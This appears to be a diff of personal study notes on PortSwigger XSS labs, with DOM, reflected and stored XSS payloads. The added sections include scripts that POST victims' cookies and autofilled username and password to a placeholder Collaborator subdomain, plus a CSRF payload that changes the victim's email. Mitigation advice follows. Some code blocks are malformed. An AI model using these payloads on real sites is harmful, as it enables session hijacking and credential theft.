@@ -27,7 +27,6 @@ SVG tags can include scripting capabilities, such as JavaScript, through attribu
 
 
 ## **3. DOM XSS in `innerHTML` sink using source `location.search`**
-
 String has been placed inside an `img src` attribute. 
 The value of the `src` attribute is invalid and throws an error. This triggers the `onerror` event handler, which then calls the `alert()` function. 
 
@@ -52,7 +51,6 @@ javascript:alert(document.cookie)
 
 
 ## **5. Reflected XSS into attribute with angle brackets HTML-encoded**
-
 String has been reflected inside a quoted attribute `value` and we will use onmouseover='alert(0)'
 
 ` " onmouseover='alert(0)' `
@@ -61,24 +59,22 @@ String has been reflected inside a quoted attribute `value` and we will use onmo
 
 
 ## **6. Stored XSS into anchor href attribute with double quotes HTML-encoded**
-
 String has been reflected inside an anchor `href` attribute
+
 ![[Pasted image 20240713161951.png]]
 
 
 ## **7. Reflected XSS into a JavaScript string with angle brackets HTML encoded**
-
 String has been reflected inside a JavaScript string
+
 ![[Pasted image 20240713173758.png]]
 ![[Pasted image 20240713173710.png]]
 
 
 ## **8. XSS in a storeID parameter**
-
 JavaScript extracts a `storeId` parameter from the `location.search` source. It then uses `document.write` to create a new option in the select element for the stock checker functionality.
 
 Adding a `storeId` query parameter to the URL and enter a random alphanumeric string as its value we notice that the string is now listed as one of the options in the drop-down list.
-
 ` ?productId=1& storeId=paein </option></select><img src="0" onerror="alert(1)"
 
 ![[Pasted image 20240713181806.png]]
@@ -485,10 +481,16 @@ This lab contains a [stored XSS](https://portswigger.net/web-security/cross-sit
 2. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard.
 3. Submit the following payload in a blog comment, inserting your Burp Collaborator subdomain where indicated:
     
-    `<script> fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { method: 'POST', mode: 'no-cors', body:document.cookie }); </script>`
+    ```
+    <script>
+     
+    fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { method: 'POST', mode: 'no-cors', body:document.cookie });
     
-    This script will make anyone who views the comment issue a POST request containing their cookie to your subdomain on the public Collaborator server.
+    </script>
+``
     
+This script will make anyone who views the comment issue a POST request containing their cookie to your subdomain on the public Collaborator server.
+
 4. Go back to the Collaborator tab, and click "Poll now". You should see an HTTP interaction. If you don't see any interactions listed, wait a few seconds and try again.
 5. Take a note of the value of the victim's cookie in the POST body.
 6. Reload the main blog page, using Burp Proxy or Burp Repeater to replace your own session cookie with the one you captured in Burp Collaborator. Send the request to solve the lab. To prove that you have successfully hijacked the admin user's session, you can use the same cookie in a request to `/my-account` to load the admin user's account page.
@@ -496,3 +498,108 @@ This lab contains a [stored XSS](https://portswigger.net/web-security/cross-sit
 Without using Burp Collaborator - Alternatively, you could adapt the attack to make the victim post their session cookie within a blog comment by [exploiting the XSS to perform CSRF](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf). However, this is far less subtle because it exposes the cookie publicly, and also discloses evidence that the attack was performed.
 
 ## **20. Exploiting cross-site scripting to capture passwords**
+This lab contains a [stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's username and password then use these credentials to log in to the victim's account.
+1. Using [Burp Suite Professional](https://portswigger.net/burp/pro), go to the [Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) tab.
+2. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard.
+3. Submit the following payload in a blog comment, inserting your Burp Collaborator subdomain where indicated:
+```
+   <input name=username id=username> 
+  <input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{ method:'POST', mode: 'no-cors', body:username.value+':'+this.value });">
+```
+This script will make anyone who views the comment issue a POST request containing their username and password to your subdomain of the public Collaborator server.
+
+4. Go back to the Collaborator tab, and click "Poll now". You should see an HTTP interaction. If you don't see any interactions listed, wait a few seconds and try again.
+5. Take a note of the value of the victim's username and password in the POST body.
+6. Use the credentials to log in as the victim user.
+
+If autofill is active and accessible via JavaScript, this poses a security risk. Attackers can exploit this by injecting malicious scripts (e.g., through an XSS vulnerability) to read and send the autofilled credentials to an external server.
+
+- payload to inject
+	![[Pasted image 20240915034504.png]]
+		![[Pasted image 20240915034624.png]]
+		
+
+#### **Check the Input Field Attributes:**
+- Autofill relies on certain attributes in the input fields, such as `name`, `id`, and `autocomplete`.
+- The browser might use the `name` or `id` attribute to identify the fields. In this case, "username" and "password" are common names that browsers use to autofill.
+- Ensure these fields don’t have an `autocomplete="off"` or `autocomplete="new-password"` attribute, which would typically prevent autofill.
+    ```
+    <input name="username" id="username"> 
+    <input type="password" name="password">
+``
+
+- Since there's no `autocomplete` attribute set to "off," browsers may attempt to autofill these fields.
+
+**Mitigation**
+- Use the `autocomplete` attribute to guide browsers not to autofill sensitive fields:
+    
+    ```
+    <input name="username" id="username" autocomplete="off"> 
+    <input type="password" name="password" autocomplete="new-password">
+``
+
+OR 
+
+correct input form:
+```
+<input type="text" name="user_identifier" id="user_identifier" placeholder="Enter your user ID"> 
+<input type="password" name="user_key" id="user_key" placeholder="Enter your secret key">
+```
+
+- **Use Unique `name` and `id` Attributes:**
+	Avoid using common names like "username" and "password" for input fields that might prompt browsers to autofill.
+
+- **Use `SameSite` Cookies and `HttpOnly` Attributes:**
+	Protect session cookies with `SameSite` and `HttpOnly` attributes to minimize the impact of credential exfiltration.
+
+- **Content Security Policy (CSP):**
+	Implement a strict CSP to prevent inline JavaScript execution and unauthorized external requests.
+
+## **21. Exploiting XSS to perform CSRF**
+This lab contains a [stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) vulnerability in the blog comments function. To solve the lab, exploit the vulnerability to perform a [CSRF attack](https://portswigger.net/web-security/csrf) and change the email address of someone who views the blog post comments.
+
+1. Log in using the credentials provided. On your user account page, notice the function for updating your email address.
+2. If you view the source for the page, you'll see the following information:
+    - You need to issue a POST request to `/my-account/change-email`, with a parameter called `email`.
+    - There's an anti-CSRF token in a hidden input called `token`.This means your exploit will need to load the user account page, extract the CSRF token, and then use the token to change the victim's email address.
+3. Submit the following payload in a blog comment:
+    
+    ```
+    `<script>
+    
+     var req = new XMLHttpRequest();
+     req.onload = handleResponse;
+     
+     req.open('get','/my-account',true); 
+     req.send(); function handleResponse() { var token this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+      
+     var changeReq = new XMLHttpRequest(); 
+     changeReq.open('post', '/my-account/change-email', true); 
+     changeReq.send('csrf='+token+'&email=test@test.com') };
+    
+     </script>`
+``
+    
+This will make anyone who views the comment issue a POST request to change their email address to `test@test.com`.
+
+	![[Pasted image 20240915033546.png]]
+		![[Pasted image 20240915033425.png]]
+
+- payload to inject:
+	![[Pasted image 20240915034247.png]]
+		![[Pasted image 20240915034146.png]]
+
+
+**To be continued...**
+
+[Reflected XSS with AngularJS sandbox escape without strings](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-without-strings)
+
+[Reflected XSS with AngularJS sandbox escape and CSP](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-and-csp)
+
+[Reflected XSS with event handlers and `href` attributes blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked)
+
+[Reflected XSS in a JavaScript URL with some characters blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked)
+
+[Reflected XSS protected by very strict CSP, with dangling markup attack](https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack)
+
+[Reflected XSS protected by CSP, with CSP bypass](https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-csp-bypass)
